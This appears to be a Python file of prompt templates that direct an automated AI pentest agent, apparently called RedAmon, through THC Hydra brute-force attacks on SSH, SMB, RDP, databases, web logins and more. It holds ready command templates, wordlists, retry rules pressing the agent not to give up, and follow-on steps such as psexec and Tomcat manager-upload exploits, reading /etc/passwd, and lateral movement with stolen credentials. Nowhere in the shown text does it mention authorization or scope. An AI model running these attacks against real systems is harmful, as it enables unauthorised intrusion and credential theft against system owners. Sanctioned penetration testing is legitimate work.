"""
RedAmon Brute Force Credential Guess Prompts — THC Hydra

Prompts for Hydra-based brute force credential guessing attack workflows.
Replaces the legacy Metasploit auxiliary/scanner login module workflow.
"""


# =============================================================================
# HYDRA BRUTE FORCE TOOLS (THC Hydra workflow)
# =============================================================================

HYDRA_BRUTE_FORCE_TOOLS = """
## ATTACK SKILL: BRUTE FORCE CREDENTIAL GUESS (THC Hydra)

**CRITICAL: This objective has been CLASSIFIED as brute force credential guessing.**
**You MUST follow the Hydra workflow below. DO NOT switch to other attack methods.**
**Use `execute_hydra` — NOT `metasploit_console` — for all brute force attacks.**

---

## RETRY POLICY

**Maximum wordlist attempts: {hydra_max_attempts}**

If brute force fails with one wordlist strategy, you MUST try different wordlists up to {hydra_max_attempts} times:
- **Attempt 1**: OS/Cloud-aware single username + common passwords
- **Attempt 2**: Comprehensive user list + password list
- **Attempt 3**: Service-specific user:pass combo file

**DO NOT give up after first failure!** Track attempts in your TODO list.

---

## PRE-CONFIGURED FLAGS (from project settings)

The following flags are pre-configured by the project administrator. **Always include them** in every `execute_hydra` call:
```
{hydra_flags}
```

**Thread limit overrides:** Some protocols have hard max thread limits that OVERRIDE the pre-configured `-t` value:
| Protocol | Max `-t` | Reason |
|----------|----------|--------|
| SSH | 4 | Connection rate limiting causes resets |
| RDP | 1 | Service crashes under parallel load |
| VNC | 4 | Connection limits |
| All others | Use pre-configured value | Safe default |

If the pre-configured `-t` exceeds the protocol max, **replace it** with the protocol-specific limit.

---

## MANDATORY BRUTE FORCE WORKFLOW

### Step 0: Gather Target Context (BEFORE attack)

**Check `target_info.technologies` in the prompt context for OS/platform hints.**

Look for keywords like:
- `Ubuntu`, `Debian`, `CentOS`, `RHEL`, `Amazon Linux` -> Linux variants
- `Windows Server`, `Windows 10/11` -> Windows
- `Apache`, `nginx`, `OpenSSH` -> Service versions may hint at OS
- Cloud indicators in IP/hostname -> AWS, Azure, GCP

**If target_info.technologies is empty or unclear:**
1. Query the graph: `"What technologies are detected on <target-ip>?"`
2. Or use naabu with service detection: `-host <ip> -p <port> -json`
3. Check SSH banner if targeting SSH (often reveals OS)

**After Step 0, request `transition_phase` to exploitation before proceeding to Step 1.**
This unlocks `execute_hydra` and ensures findings are tracked correctly.

### Step 1: Select Hydra Protocol

Based on the target service, select the correct Hydra protocol string:

| Service | Port | Hydra Protocol | Notes |
|---------|------|----------------|-------|
| SSH | 22 | `ssh` | Max `-t 4`. Most common target. |
| FTP | 21 | `ftp` | |
| Telnet | 23 | `telnet` | |
| SMB | 445 | `smb` | Supports `DOMAIN\\user` syntax |
| RDP | 3389 | `rdp` | Max `-t 1`. Very slow. |
| VNC | 5900 | `vnc` | **Password-only**: use `-p "" -P <file>` (no username) |
| MySQL | 3306 | `mysql` | |
| MSSQL | 1433 | `mssql` | |
| PostgreSQL | 5432 | `postgres` | |
| MongoDB | 27017 | `mongodb` | |
| Redis | 6379 | `redis` | **Password-only**: use `-p "" -P <file>` |
| POP3 | 110 | `pop3` | Use `-S` for POP3S (port 995) |
| IMAP | 143 | `imap` | Use `-S` for IMAPS (port 993) |
| SMTP | 25/587 | `smtp` | Use `-S` for SMTPS |
| HTTP Basic | 80/443 | `http-get` | Append path: `http-get://target/admin` |
| HTTP POST Form | 80/443 | `http-post-form` | **Special syntax** (see below) |
| Tomcat | 8080 | `http-get` | Path: `/manager/html` |
| WordPress | 80/443 | `http-post-form` | Analyze login form first |
| Jenkins | 8080 | `http-post-form` | Path: `/j_acegi_security_check` |
| Oracle | 1521 | `oracle-listener` | |
| SNMP | 161 | `snmp` | Community string guessing |

**Non-default port:** Add `-s PORT` flag (e.g., `-s 2222` for SSH on port 2222).
**SSL/TLS:** Add `-S` flag for encrypted connections.

### Step 2: Build and Execute Hydra Command

**Each attempt = ONE `execute_hydra` call.** Build the command with:
1. Username flags: `-l USER` (single) or `-L FILE` (list) or `-C FILE` (combo)
2. Password flags: `-p PASS` (single) or `-P FILE` (list)
3. Pre-configured flags: `{hydra_flags}` (always include, but respect thread limits)
4. Target: `protocol://IP[:PORT]`

#### SSH Brute Force Templates (by attempt):

**Attempt 1 — OS-aware single username:**

Ubuntu/Debian:
```
-l ubuntu -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt -t 4 {hydra_flags_no_t} ssh://<ip>
```

Amazon Linux/AWS:
```
-l ec2-user -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt -t 4 {hydra_flags_no_t} ssh://<ip>
```

Generic Linux (root):
```
-l root -P /usr/share/metasploit-framework/data/wordlists/common_roots.txt -t 4 {hydra_flags_no_t} ssh://<ip>
```

Windows:
```
-l Administrator -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt -t 4 {hydra_flags_no_t} ssh://<ip>
```

**Attempt 2 — Comprehensive user + password lists:**
```
-L /usr/share/metasploit-framework/data/wordlists/unix_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt -t 4 {hydra_flags_no_t} ssh://<ip>
```

**Attempt 3 — Service-specific combo file:**
```
-C /usr/share/metasploit-framework/data/wordlists/piata_ssh_userpass.txt -t 4 {hydra_flags_no_t} ssh://<ip>
```

**NOTE on `-t` override:** For SSH, always use `-t 4` regardless of the pre-configured `-t` value. The `{{hydra_flags_no_t}}` placeholder means: use all pre-configured flags EXCEPT `-t` (replace with protocol-safe limit). In practice, manually set `-t 4` and include the rest of the flags.

#### FTP Brute Force Templates:
```
-l admin -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt {hydra_flags} ftp://<ip>
```

#### SMB Brute Force Templates:
```
-l administrator -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt {hydra_flags} smb://<ip>
```
With domain: `-l "DOMAIN\\administrator" -P passwords.txt {hydra_flags} smb://<ip>`

#### VNC Brute Force Templates (password-only):
```
-p "" -P /usr/share/metasploit-framework/data/wordlists/vnc_passwords.txt {hydra_flags} vnc://<ip>
```

#### MySQL Brute Force Templates:
```
-l root -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt {hydra_flags} mysql://<ip>
```

#### PostgreSQL Brute Force Templates:
```
-l postgres -P /usr/share/metasploit-framework/data/wordlists/postgres_default_pass.txt {hydra_flags} postgres://<ip>
```

#### Redis Brute Force Templates (password-only):
```
-p "" -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt {hydra_flags} redis://<ip>
```

#### HTTP Basic Auth:
```
-l admin -P /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt {hydra_flags} http-get://<ip>/admin
```

#### HTTP POST Form (SPECIAL SYNTAX):

**IMPORTANT:** For `http-post-form`, the target IP comes BEFORE the protocol, and the form specification uses colon `:` separators:

```
-l admin -P /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt {hydra_flags} <ip> http-post-form "/login.php:username=^USER^&password=^PASS^:F=Invalid"
```

**Form specification format:** `"/path:POST_BODY:CONDITION"`
- `^USER^` = username placeholder (replaced by Hydra)
- `^PASS^` = password placeholder (replaced by Hydra)
- `F=string` = **Failure** condition — response containing this string means login FAILED
- `S=string` = **Success** condition — response containing this string means login SUCCEEDED
- `H=Header: value` = Custom HTTP header to include
- `C=/path` = URL to visit first for cookie gathering

**WordPress example:**
```
-l admin -P passwords.txt {hydra_flags} <ip> http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid username"
```

**Jenkins example:**
```
-l admin -P passwords.txt {hydra_flags} <ip> http-post-form "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^:F=Invalid"
```

#### Tomcat Manager:
```
-l tomcat -P /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_pass.txt {hydra_flags} http-get://<ip>:8080/manager/html
```
Or with combo file:
```
-C /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_userpass.txt {hydra_flags} http-get://<ip>:8080/manager/html
```

### Step 3: Parse Results

**Hydra output patterns:**

| Output Pattern | Meaning |
|---------------|---------|
| `[22][ssh] host: 10.0.0.5   login: root   password: toor` | **SUCCESS** - credentials found |
| `1 of 1 target successfully completed, 1 valid password found` | Confirmation of success |
| `0 valid passwords found` | **FAILED** - no credentials found |
| `[ERROR] target ssh://10.0.0.5/ does not support password authentication` | Wrong auth method |
| `[ERROR] could not connect to ssh://10.0.0.5` | Target unreachable or port closed |
| `[WARNING] ... restoring connection` | Thread count too high, reduce `-t` |

### Step 3b: RETRY LOGIC (if no credentials found)

**If `0 valid passwords found`:**

1. Check your current attempt number (track in TODO list)
2. If attempts < {hydra_max_attempts}: Go back to **Step 2** with next wordlist strategy
3. If attempts >= {hydra_max_attempts}: Report failure with action="complete"

**Track attempts in TODO list:**
```
1. [x] Attempt 1: -l ubuntu -P unix_passwords.txt - FAILED (0 valid)
2. [~] Attempt 2: -L unix_users.txt -P unix_passwords.txt - IN PROGRESS
3. [ ] Attempt 3: -C piata_ssh_userpass.txt - PENDING
```

### Step 4: Session Establishment (after credentials found)

**Hydra is stateless — it does NOT create persistent sessions.**
After finding credentials, you MUST establish access manually:

| Service | Tool | Command |
|---------|------|---------|
| SSH | `kali_shell` | `sshpass -p '<password>' ssh -o StrictHostKeyChecking=no <user>@<ip> 'whoami && id && uname -a'` |
| SMB | `metasploit_console` | `use exploit/windows/smb/psexec; set SMBUser <user>; set SMBPass <pass>; set RHOSTS <ip>; run` |
| MySQL | `kali_shell` | `mysql -h <ip> -u <user> -p'<password>' -e 'SELECT user(); SHOW DATABASES;'` |
| PostgreSQL | `kali_shell` | `PGPASSWORD='<password>' psql -h <ip> -U <user> -c 'SELECT current_user;'` |
| FTP | `kali_shell` | `curl -u <user>:<password> ftp://<ip>/` |
| Telnet | `kali_shell` | `(echo '<user>'; sleep 1; echo '<password>'; sleep 1; echo 'whoami') \\| telnet <ip>` |
| Redis | `kali_shell` | `redis-cli -h <ip> -a '<password>' INFO` |
| MongoDB | `kali_shell` | `mongosh --host <ip> -u <user> -p '<password>' --eval 'db.adminCommand("listDatabases")'` |
| VNC | `kali_shell` | `echo '<password>' \\| timeout 5 vncviewer <ip> -passwd /dev/stdin` |
| HTTP | `execute_curl` | Login with discovered credentials |
| Tomcat | `metasploit_console` | `use exploit/multi/http/tomcat_mgr_upload; set HttpUsername <user>; set HttpPassword <pass>; set RHOSTS <ip>; set RPORT 8080; run` |

**After establishing access:**
- For SSH: request phase transition to `post_exploitation` using action="transition_phase"
- For SMB psexec: session auto-created, proceed to post-exploitation
- For other services: report credentials with action="complete"

**Shell session commands (after SSH access):**
```
whoami                -> Check current user
id                    -> User/group IDs
uname -a              -> System information
cat /etc/passwd       -> List users
sudo -l               -> Check sudo permissions
```

---

## CREDENTIAL REUSE AFTER DISCOVERY

If credentials are found for any service:
1. The attack is successful - credentials have been discovered
2. Inform the user of the discovered credentials (username + password + service)
3. Credentials can be used for:
   - Direct service access (SSH, FTP, database clients)
   - Lateral movement to other systems
   - Pass-the-hash/pass-the-password attacks (SMB)
   - Further exploitation using the credentials

Use `action="complete"` after successfully discovering and reporting credentials.
"""


# =============================================================================
# HYDRA WORDLIST GUIDANCE
# =============================================================================

HYDRA_WORDLIST_GUIDANCE = """
## Available Wordlists Reference

**Location:** `/usr/share/metasploit-framework/data/wordlists/`

**Hydra flag mapping:**
- Single username: `-l <username>`
- Username list file: `-L <file>`
- Single password: `-p <password>`
- Password list file: `-P <file>`
- Colon-separated user:pass combo file: `-C <file>` (replaces -l/-L/-p/-P)

### General Purpose (Use for comprehensive brute force)
| File | Hydra Usage | Description |
|------|-------------|-------------|
| `unix_users.txt` | `-L` | Common Unix usernames (~170 entries) |
| `unix_passwords.txt` | `-P` | Common Unix passwords (~1000 entries) |
| `password.lst` | `-P` | General password list (~2000 entries) |
| `burnett_top_1024.txt` | `-P` | Top 1024 most common passwords |
| `burnett_top_500.txt` | `-P` | Top 500 most common passwords |
| `common_roots.txt` | `-P` | Common root passwords |
| `keyboard-patterns.txt` | `-P` | Keyboard pattern passwords (qwerty, 123456, etc.) |
| `namelist.txt` | `-P` | Common names used as passwords |

### SSH
| File | Hydra Usage | Description |
|------|-------------|-------------|
| `piata_ssh_userpass.txt` | `-C` | SSH username:password combos |
| `root_userpass.txt` | `-C` | Root user credentials |

### HTTP / Web Services
| File | Hydra Usage | Description |
|------|-------------|-------------|
| `http_default_pass.txt` | `-P` | HTTP default passwords |
| `http_default_users.txt` | `-L` | HTTP default usernames |
| `http_default_userpass.txt` | `-C` | HTTP user:pass combos |
| `http_owa_common.txt` | `-P` | Outlook Web Access common creds |

### Tomcat
| File | Hydra Usage | Description |
|------|-------------|-------------|
| `tomcat_mgr_default_pass.txt` | `-P` | Tomcat Manager passwords |
| `tomcat_mgr_default_users.txt` | `-L` | Tomcat Manager usernames |
| `tomcat_mgr_default_userpass.txt` | `-C` | Tomcat Manager user:pass combos |

### Databases
| File | Hydra Usage | Description |
|------|-------------|-------------|
| `postgres_default_pass.txt` | `-P` | PostgreSQL passwords |
| `postgres_default_user.txt` | `-L` | PostgreSQL usernames |
| `postgres_default_userpass.txt` | `-C` | PostgreSQL user:pass combos |
| `oracle_default_userpass.txt` | `-C` | Oracle DB defaults |
| `db2_default_pass.txt` | `-P` | IBM DB2 passwords |
| `db2_default_user.txt` | `-L` | IBM DB2 usernames |
| `db2_default_userpass.txt` | `-C` | IBM DB2 user:pass combos |

### VNC
| File | Hydra Usage | Description |
|------|-------------|-------------|
| `vnc_passwords.txt` | `-P` | Common VNC passwords (password-only: use `-p "" -P`) |

### SNMP
| File | Hydra Usage | Description |
|------|-------------|-------------|
| `snmp_default_pass.txt` | `-P` | SNMP community strings |

For other service-specific wordlists, check `/usr/share/metasploit-framework/data/wordlists/` or use `web_search`.
"""
